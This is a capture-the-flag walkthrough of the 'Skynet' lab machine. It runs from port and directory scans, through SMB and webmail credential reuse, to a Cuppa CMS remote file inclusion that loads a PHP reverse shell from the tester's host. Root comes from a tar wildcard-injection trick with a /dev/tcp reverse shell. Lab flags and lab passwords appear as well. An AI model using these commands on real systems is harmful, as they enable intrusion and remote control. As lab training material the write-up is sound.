#CTF 

## Recon

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL AUTH-RESP-CODE PIPELINING RESP-CODES UIDL CAPA TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK post-login more ID capabilities have Pre-login LOGINDISABLEDA0001 LITERAL+ IDLE IMAP4rev1 SASL-IR listed ENABLE LOGIN-REFERRALS
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-08T17:49:15
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-06-08T12:49:16-05:00
```

Gobuster

```
===============================================================
2023/06/08 13:50:19 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.10.254.249/admin/]
/config               (Status: 301) [Size: 315] [--> http://10.10.254.249/config/]                                                              
/css                  (Status: 301) [Size: 312] [--> http://10.10.254.249/css/]                                                                 
/index.html           (Status: 200) [Size: 523]
/js                   (Status: 301) [Size: 311] [--> http://10.10.254.249/js/]                                                                  
/server-status        (Status: 403) [Size: 278]
/squirrelmail         (Status: 301) [Size: 321] [--> http://10.10.254.249/squirrelmail/]                                                        
Progress: 4584 / 4615 (99.33%)
===============================================================
2023/06/08 13:50:54 Finished
===============================================================
```

## Access

To see the SMB shares I type
`smbmap -H 10.10.254.249 `

```
[+] Guest session       IP: 10.10.254.249:445   Name: 10.10.254.249                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
```

anonymous I readonly , so I can access it, and to do so I type:
`smbclient //[ip]/anonymous` and I am in.
I grab attention.txt and the log files.
log1.txt has some potential passwords

I navigate to the http page /squirrelmail
I enter milesdyson as username and as password cyborg007haloterminator that I took from log1.txt

I am in. I open the first mai and it says
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

I have the creds for the milesdyson smb share
So I login. I get /notes/important.txt
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

The secret directory is /45kra24zxs28v3yd
I use Gobuster on it
```
===============================================================
2023/06/08 14:08:35 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/administrator        (Status: 301) [Size: 339] [--> http://10.10.254.249/45kra24zxs28v3yd/administrator/]                                      
/index.html           (Status: 200) [Size: 418]
Progress: 4587 / 4615 (99.39%)
===============================================================
2023/06/08 14:09:09 Finished
===============================================================
```


## Exploitation

I go to /administrator and find a login form.
I will try to exploit the Cuppa CMS
```
searchsploit cuppa      
-------------------------------------- ---------------------------------
 Exploit Title                        |  Path
-------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' L | php/webapps/25971.txt
-------------------------------------- ---------------------------------
```

I downloaded a reverse shell script , changed the ip and port.
I opened a Netcat session on that port
I opened a python local server
Lastly I typed
```
curl http://[ip]/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php/?urlConfig\=http://10.8.100.122:80/php-reverse-shell.php
```

So the netcat session got the connection.
Found the flag on /home/milesdyson
`7ce5c2109a40f958099283600a9ae807`
## Privilege Escalation

By viewing /etc/crontab 
```
# m h dom mon dow user  command                                                                                                                                                                                                             
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh                                                                                                                                                                                  
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly                                                                                                                                                                         
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )                                                                                                                                         
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )                                                                                                                                        
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )   
```

I notice that  /home/milesdyson/backups/backup.sh get called every minute
```
#!/bin/bash                                     
cd /var/www/html                                        
tar cf /home/milesdyson/backups/backup.tgz * 
```


I open a Netcat listener on 8585

To exploit it I type
`cd /var/www/html`
`printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.100.122/8585 0>&1\n' > rev.sh``
`touch /var/www/html/--checkpoint-action=exec=bash\ rev.sh`
 `touch /var/www/html/--checkpoint=1`

And I am in as root and get the flag
`3f0372db24753accc7179a282cd6a949`